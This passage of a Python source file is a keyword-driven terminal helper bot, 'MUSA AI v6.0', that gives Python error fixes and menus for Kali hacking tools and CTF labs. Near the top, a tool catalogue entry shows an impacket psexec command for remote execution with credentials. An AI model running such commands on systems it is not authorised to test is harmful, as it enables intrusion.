                     "category": "Exploit"},
    "impacket": {"desc": "Network protocol toolkit", "example": "python3 psexec.py user:pass@target",
                 "category": "Exploit"},
}


# ====================== PYTHON ERROR SOLVER ======================
def solve_python_error(error_text):
    error_solutions = {
        "syntaxerror": """
🔴 SYNTAX ERROR DETECTED!

Common Causes:
  1. Missing colon (:) after if/for/def/class
  2. Unmatched parentheses ()[]{}
  3. Missing quotes around strings
  4. Wrong indentation

Quick Fix:
  • Check the line NUMBER mentioned in error
  • Look at that line and the line ABOVE it
  • Make sure all brackets are closed
  • Use an IDE like VSCode for automatic detection
""",
        "indentationerror": """
🔴 INDENTATION ERROR DETECTED!

Python uses indentation (spaces) to define code blocks!

Rule: Use 4 SPACES for indentation (not tab mixed with spaces)

Fix:
  • In VSCode: Use 'Indent Using Spaces' setting
  • In terminal: Use 'expand' command to convert tabs to spaces
  • Quick fix command:
    sed -i 's/\\t/    /g' your_file.py

Example:
  WRONG:          RIGHT:
  def f():        def f():
  print("hi")        print("hi")
""",
        "nameerror": """
🔴 NAME ERROR DETECTED!

This means you used a variable/function that doesn't exist yet!

Possible Causes:
  1. Variable defined AFTER it's used
  2. Typo in variable name (Python is case-sensitive!)
  3. Variable defined inside function, used outside
  4. Forgot to import a module

Fix:
  1. Check variable is defined BEFORE use
  2. Check spelling (name vs Name vs NAME)
  3. Make sure import statements are at the top
""",
        "typeerror": """
🔴 TYPE ERROR DETECTED!

You're using the wrong data type for an operation!

Common cases & fixes:
  1. String + Integer → Convert: str(number) or int(string)
  2. NoneType → Your function forgot to return a value!
  3. Not iterable → You're looping over a non-list
  4. Wrong arguments → Check function documentation

Debug tip:
  print(type(variable))  # Check what type it actually is
""",
        "modulenotfounderror": """
🔴 MODULE NOT FOUND ERROR!

Library install nahi hai ya wrong name hai!

Fix:
  pip install <module_name>
  pip3 install <module_name>
  sudo pip3 install <module_name>

Common Libraries:
  pip3 install requests    # HTTP requests
  pip3 install beautifulsoup4  # Web scraping
  pip3 install paramiko    # SSH
  pip3 install cryptography   # Encryption
  pip3 install flask       # Web framework
  pip3 install numpy       # Math/Arrays
  pip3 install pandas      # Data analysis
  pip3 install scapy       # Network packets

If module exists but still error:
  python3 -m pip install <module>
  Check: which python3 | which pip3
""",
        "indexerror": """
🔴 INDEX ERROR DETECTED!

You're accessing a list index that doesn't exist!

Fix:
  # Always check length first:
  if len(my_list) > index:
      print(my_list[index])

  # Or use try-except:
  try:
      print(my_list[5])
  except IndexError:
      print("Index out of range!")

  # Use negative index for last element:
  print(my_list[-1])   # Last item (safe)
""",
        "keyerror": """
🔴 KEY ERROR DETECTED!

Dictionary mein ye key exist nahi karti!

Fix:
  # Safe way to access:
  value = my_dict.get("key", "default_value")

  # Check before access:
  if "key" in my_dict:
      print(my_dict["key"])

  # Handle error:
  try:
      print(my_dict["key"])
  except KeyError:
      print("Key not found!")

  # See all available keys:
  print(my_dict.keys())
""",
        "filenotfounderror": """
🔴 FILE NOT FOUND ERROR!

File path galat hai ya file exist nahi karti!

Fix:
  import os

  # Check current location:
  print(os.getcwd())      # Where are you?
  print(os.listdir())     # What files exist?

  # Use absolute path:
  open("/home/user/Desktop/file.txt", "r")

  # Check if file exists before opening:
  if os.path.exists("file.txt"):
      with open("file.txt") as f:
          content = f.read()
  else:
      print("File not found!")
""",
        "zerodivisionerror": """
🔴 ZERO DIVISION ERROR!

Kisi number ko zero se divide kar rahe ho!

Fix:
  # Check before dividing:
  if divisor != 0:
      result = number / divisor
  else:
      print("Cannot divide by zero!")

  # Or with try-except:
  try:
      result = number / divisor
  except ZeroDivisionError:
      result = 0   # Default value

  # Or use conditional expression:
  result = number / divisor if divisor != 0 else 0
""",
        "valueerror": """
🔴 VALUE ERROR DETECTED!

Value ka type sahi hai but value invalid hai!

Common causes:
  1. int("hello") → Can't convert non-number string
  2. math.sqrt(-1) → Can't sqrt negative
  3. int("3.14") → Use float() first

Fix:
  # Safe int conversion:
  try:
      number = int(input("Enter number: "))
  except ValueError:
      print("Please enter a valid number!")

  # Check before conversion:
  user_input = input()
  if user_input.isdigit():
      number = int(user_input)
  else:
      print("Invalid input!")
"""
    }

    error_lower = error_text.lower()
    for error_type, solution in error_solutions.items():
        if error_type in error_lower:
            return solution

    return """
🔍 ERROR ANALYSIS:

I need more details to give the perfect solution!

Please tell me:
  1. The EXACT error message (copy-paste it)
  2. The line number where error occurred
  3. Your code (even a small snippet)

Or send me the error like:
  'solve NameError: name x is not defined'

And I'll fix it immediately! 💪
"""


# ====================== SMART RESPONSE ENGINE (UPGRADED) ======================
def get_intelligent_response(question):
    q = question.lower().strip()

    # ===== ERROR SOLVER =====
    if any(k in q for k in
           ["error", "failed", "not working", "fix", "bug", "crash", "denied", "exception", "traceback"]):

        # Python specific errors
        python_errors = ["syntaxerror", "indentationerror", "nameerror", "typeerror",
                         "modulenotfounderror", "indexerror", "keyerror", "filenotfounderror",
                         "zerodivisionerror", "valueerror", "attributeerror", "importerror"]

        for err in python_errors:
            if err in q:
                return f"🐍 PYTHON ERROR SOLVER\n{solve_python_error(q)}"

        if any(k in q for k in ["kali", "linux", "ubuntu", "apt", "sudo", "permission"]):
            return f"⚠️ KALI/LINUX ERROR DETECTED\n{KNOWLEDGE_BASE['kali errors']}"

        if any(k in q for k in ["python", "pip", "code", "script"]):
            return f"🐍 PYTHON ERROR DETECTED\n{solve_python_error(q)}"

        return """⚠️ ERROR DETECTED - Provide details for perfect solution!

Format for best help:
  'solve <error_type>: <error_message>'

Example:
  'solve NameError: name x is not defined'
  'solve kali apt lock error'
  'solve python indentation error'

Main aapka error 100% fix kar dunga! 💪"""

    # ===== LAB/CTF =====
    if any(k in q for k in
           ["lab", "ctf", "tryhackme", "hackthebox", "htb", "thm", "vulnhub", "solve", "root", "flag", "pwn"]):
        return f"🎯 LAB SOLVING MODE ACTIVATED\n{KNOWLEDGE_BASE['lab help']}"

    # ===== PYTHON ERRORS DIRECT =====
    if "solve" in q and any(k in q for k in ["error", "exception"]):
        return f"🐍 ERROR SOLVER\n{solve_python_error(q)}"

    # ===== KNOWLEDGE BASE LOOKUP =====
    for key, value in KNOWLEDGE_BASE.items():
        if key in q:
            return value

    # ===== GREETINGS =====
    greetings = {
        ("hi ", "hello", "salam", "assalam", "hey", "heyy", "hiiii"):
            f"👋 Hello Boss! MUSA AI v6.0 ONLINE!\n\nMain ready hoon:\n  🎯 Lab solving\n  🔧 Error fixing\n  💻 Python coding\n  🐉 Kali commands\n\nKya karna hai aaj? Type 'help' for commands!",
        ("how are you", "kya hal", "kaisa hai", "kaise ho"):
            "⚡ Running at MAXIMUM EFFICIENCY! All systems GO!\nReady to hack, code, and solve problems!\nAap batao Boss, kya mission hai aaj?",
        ("thank", "thanks", "shukriya", "jazakallah"):
            "💚 Welcome Boss! Ye mera kaam hai!\nHamesha ready hoon madad ke liye!\nAur kuch chahiye? Bas poochho! 🚀",
        ("bye", "goodbye", "khuda hafiz"):
            "👋 Khuda Hafiz Boss!\nHappy Hacking! 🎯\nEthically hack karna, stay safe!",
    }

    for keys, response in greetings.items():
        if any(k in q for k in keys):
            return response

    # ===== TOPIC DETECTION =====
    if any(k in q for k in ["python", "py ", ".py", "script", "code", "function", "class", "def "]):
        return f"💻 PYTHON EXPERT MODE\n{KNOWLEDGE_BASE['python commands']}"

    if any(k in q for k in ["kali", "linux", "terminal", "command line"]):
        return f"🐧 LINUX COMMANDS\n{KNOWLEDGE_BASE['linux commands']}"

    if any(k in q for k in ["nmap", "scan", "port scan"]):
        return KNOWLEDGE_BASE.get("nmap", "Ask me 'show nmap' for complete guide!")

    if any(k in q for k in ["password", "crack", "hash", "john", "hashcat"]):
        return KNOWLEDGE_BASE.get("john", "Ask me 'john' for complete cracking guide!")

    if any(k in q for k in ["sql", "injection", "sqlmap", "database"]):
        return KNOWLEDGE_BASE.get("sqlmap", "Ask me 'sqlmap' for complete guide!")

    if any(k in q for k in ["privesc", "privilege", "root", "escalat"]):
        return KNOWLEDGE_BASE.get("privilege escalation", "Ask me 'privilege escalation' for guide!")

    if any(k in q for k in ["osint", "intelligence", "recon", "information gather"]):
        return KNOWLEDGE_BASE.get("osint", "Ask me 'osint' for complete guide!")

    if any(k in q for k in ["burp", "web proxy", "intercept"]):
        return KNOWLEDGE_BASE.get("burpsuite", "Ask me 'burpsuite' for complete guide!")

    if any(k in q for k in ["hydra", "brute force", "bruteforce"]):
        return KNOWLEDGE_BASE.get("hydra", "Ask me 'hydra' for complete guide!")

    if any(k in q for k in ["metasploit", "msf", "msfconsole", "payload", "exploit"]):
        return KNOWLEDGE_BASE.get("metasploit", "Ask me 'metasploit' for complete guide!")

    # ===== DEFAULT INTELLIGENT RESPONSE =====
    return f"""🤖 MUSA AI v6.0 - Processing your request...

Query: '{question}'

I can help you with:
  🎯 Labs: Ask 'lab help' → Complete CTF methodology
  🔧 Errors: Say 'solve <error>' → Instant fix
  🐉 Kali: Ask 'show kali' → 40+ tools guide
  💻 Python: Ask 'python commands' → Complete guide
  💥 Exploits: Ask 'metasploit' → Full framework guide
  🔍 Nmap: Ask 'nmap' → All scan types
  🔑 Passwords: Ask 'john' → Cracking guide
  💉 SQL: Ask 'sqlmap' → Injection guide
  🚀 Privesc: Ask 'privilege escalation'
  🕵️ OSINT: Ask 'osint'

Be more specific ya 'help' type karo complete menu ke liye!"""


# ====================== MAIN PROCESSING ======================
def process_input(user_input):
    text = user_input.strip()
    text_lower = text.lower()

    if not text:
        return True

    SESSION_MEMORY.append({"time": datetime.now().strftime("%H:%M"), "input": text})
    CONVERSATION_HISTORY.append(text)

    # ===== EXIT =====
    if text_lower in ["exit", "quit", "bye", "q"]:
        speak("Goodbye Boss! Keep hacking ethically! 🌟")
        speak("Remember: With great power comes great responsibility!")
        return False

    # ===== CLEAR SCREEN =====
    if text_lower in ["clear", "cls", "c"]:
        os.system("clear" if os.name != "nt" else "cls")
        print_header()
        return True

    # ===== HELP MENU =====
    if text_lower in ["help", "commands", "menu", "?"]:
        print_section("MUSA AI v6.0 - COMPLETE COMMAND CENTER")
        print(f"""{Colors.WHITE}
  ╔══════════════════════════════════════════════════════════════╗
  ║                   🎯 CYBERSECURITY & LABS                    ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  lab help           → Complete CTF/Lab methodology          ║
  ║  kali errors        → Fix all Kali Linux errors             ║
  ║  show kali          → 40+ Kali tools with examples          ║
  ║  nmap               → Complete Nmap guide                   ║
  ║  metasploit         → Full Metasploit framework             ║
  ║  gobuster           → Directory bruting guide               ║
  ║  hydra              → Brute force guide                     ║
  ║  sqlmap             → SQL injection guide                   ║
  ║  burpsuite          → Web testing guide                     ║
  ║  john               → Password cracking guide               ║
  ║  privilege escalation → PrivEsc techniques                  ║
  ║  osint              → Intelligence gathering                ║
  ╠══════════════════════════════════════════════════════════════╣
  ║                   💻 PYTHON PROGRAMMING                      ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  python commands    → Complete Python guide (200+ concepts) ║
  ║  python errors      → All Python error solutions            ║
  ║  generate script    → Professional cyber scripts            ║
  ║  solve <error>      → Auto-fix your Python errors           ║
  ╠══════════════════════════════════════════════════════════════╣
  ║                   🛠️ SYSTEM & UTILITIES                      ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  linux commands     → Complete Linux command guide          ║
  ║  kali errors        → Kali troubleshooting                  ║
  ║  memory             → View session history                  ║
  ║  clear              → Clear screen                          ║
  ║  who are you        → About MUSA AI                         ║
  ║  exit               → Quit                                  ║
  ╚══════════════════════════════════════════════════════════════╝
{Colors.ENDC}""")
        cprint("  💡 TIP: You can also ask anything in plain English!", Colors.YELLOW)
        cprint("  💡 TIP: Type 'solve NameError' to fix Python errors!", Colors.YELLOW)
        cprint("  💡 TIP: Type 'show kali' for all hacking tools!", Colors.YELLOW)
        return True

    # ===== MEMORY =====
    if text_lower in ["memory", "history", "session"]:
        print_section("SESSION MEMORY")
        if not SESSION_MEMORY:
            cprint("  No history yet!", Colors.WARNING)
        else:
            for i, entry in enumerate(SESSION_MEMORY[-10:], 1):
                print(f"  {Colors.GRAY}[{entry['time']}]{Colors.ENDC} {Colors.WHITE}{i}. {entry['input']}{Colors.ENDC}")
        return True

    # ===== SHOW KALI =====
    if text_lower in ["show kali", "kali tools", "tools", "show tools"]:
        print_section("KALI LINUX MEGA TOOLKIT (40+ Tools)")
        categories = {}
        for cmd, info in KALI_COMMANDS.items():
            cat = info['category']
            if cat not in categories:
                categories[cat] = []
            categories[cat].append((cmd, info))

        for cat, tools in sorted(categories.items()):
            cprint(f"\n  [{cat}]", Colors.OKGREEN, bold=True)
            for cmd, info in tools:
                print(f"  {Colors.OKCYAN}{cmd:<15}{Colors.ENDC} → {Colors.WHITE}{info['desc']:<35}{Colors.ENDC}")
                print(f"  {Colors.GRAY}  Ex: {info['example']}{Colors.ENDC}")
        return True

    # ===== DIRECT KNOWLEDGE BASE =====
    for key in KNOWLEDGE_BASE:
        if key == text_lower or (len(key) > 4 and key in text_lower):
            print_answer(f"📚 {key.upper()}", KNOWLEDGE_BASE[key])
            return True

    # ===== SOLVE SPECIFIC COMMAND =====
    if text_lower.startswith("solve"):
        error_part = text[5:].strip()
        solution = solve_python_error(error_part)
        if "more details" not in solution:
            print_answer("🔧 ERROR SOLUTION", solution)
        else:
            speak(solution)
        return True

    # ===== KALI COMMAND LOOKUP =====
    for cmd in KALI_COMMANDS:
        if cmd in text_lower and len(cmd) > 3:
            info = KALI_COMMANDS[cmd]
            print_section(f"KALI TOOL: {cmd.upper()}")
            print(f"""
  {Colors.OKGREEN}Tool:{Colors.ENDC}     {cmd}
  {Colors.OKGREEN}Category:{Colors.ENDC} {info['category']}
  {Colors.OKGREEN}Purpose:{Colors.ENDC}  {info['desc']}
  {Colors.OKGREEN}Example:{Colors.ENDC}  {Colors.YELLOW}{info['example']}{Colors.ENDC}

  {Colors.OKCYAN}For complete guide, type: '{cmd}'{Colors.ENDC}
            """)
            return True

    # ===== INTELLIGENT RESPONSE =====
    response = get_intelligent_response(user_input)
    if len(response) > 200:
        print_answer("🤖 MUSA AI ANALYSIS", response)
    else:
        speak(response)

    return True


# ====================== ANIMATED HEADER ======================
def print_header():
    os.system("clear" if os.name != "nt" else "cls")
    now = datetime.now()

    print(f"{Colors.OKCYAN}", end="")
    print("╔" + "═" * 70 + "╗")

    logo_lines = [
        "███╗   ███╗██╗   ██╗███████╗ █████╗      █████╗ ██╗",
        "████╗ ████║██║   ██║██╔════╝██╔══██╗    ██╔══██╗██║",
        "██╔████╔██║██║   ██║███████╗███████║    ███████║██║",
        "██║╚██╔╝██║██║   ██║╚════██║██╔══██║    ██╔══██║██║",
        "██║ ╚═╝ ██║╚██████╔╝███████║██║  ██║    ██║  ██║██║",
        "╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝",
    ]

    for line in logo_lines:
        padding = (70 - len(line)) // 2
        print(
            f"║{Colors.BOLD}{Colors.OKGREEN}{' ' * padding}{line}{' ' * (70 - len(line) - padding)}{Colors.ENDC}{Colors.OKCYAN}║")

    print("╠" + "═" * 70 + "╣")

    info_lines = [
        f"✦ v6.0 ULTIMATE CYBER & PYTHON SPECIALIST EDITION ✦",
        f"✦ Date: {now.strftime('%A, %B %d, %Y')}  |  Time: {now.strftime('%I:%M %p')} ✦",
        f"✦ 40+ Tools | 200+ Python Concepts | Complete CTF Guide ✦",
    ]

    for line in info_lines:
        padding = (70 - len(line)) // 2
        print(
            f"║{Colors.YELLOW}{' ' * padding}{line}{' ' * max(0, 70 - len(line) - padding)}{Colors.ENDC}{Colors.OKCYAN}║")

    print("╚" + "═" * 70 + "╝")
    print(Colors.ENDC)


# ====================== STARTUP SEQUENCE ======================
def startup_animation():
    checks = [
        "Cybersecurity Database",
        "Python Knowledge Engine",
        "Kali Linux Tools Database",
        "CTF/Lab Solver Module",
        "Error Detection System",
        "OSINT Intelligence Module",
    ]

    cprint("\n  🔄 Initializing MUSA AI Systems...\n", Colors.OKCYAN)

    for check in checks:
        print(f"  {Colors.GRAY}[{Colors.OKGREEN}✓{Colors.GRAY}]{Colors.ENDC} {Colors.WHITE}{check:<35}{Colors.ENDC} ",
              end="", flush=True)
        time.sleep(0.1)
        cprint("READY", Colors.OKGREEN, bold=True)

    print()
    cprint("  ═" * 36, Colors.OKCYAN)
    cprint("  ✅ All systems operational! MUSA AI v6.0 ONLINE!", Colors.OKGREEN, bold=True)
    cprint("  ═" * 36, Colors.OKCYAN)
    time.sleep(0.3)


# ====================== MAIN FUNCTION ======================
def main():
    print_header()
    startup_animation()

    speak(f"Assalam o Alaikum {USER_NAME}! MUSA AI v6.0 is now FULLY OPERATIONAL!")
    speak("Main aapki madad karne ke liye ready hoon.")
    speak("Type 'help' for the complete menu | 'show kali' for hacking tools | 'lab help' for CTF guide!")

    while True:
        try:
            print(f"\n{Colors.GRAY}{'─' * 70}{Colors.ENDC}")
            user_input = input(f"\n{Colors.OKBLUE}👤 {USER_NAME} → {Colors.ENDC}").strip()

            if not user_input:
                continue

            if not process_input(user_input):
                break

        except KeyboardInterrupt:
            print()
            speak("Session interrupted! Goodbye Boss! 🌟")
            speak("Remember: Hack Ethically, Learn Constantly!")
            break
        except Exception as e:
            cprint(f"\n  [⚠️  System]: Minor error occurred. Continuing... ({str(e)[:50]})", Colors.WARNING)
            continue


if __name__ == "__main__":
    main()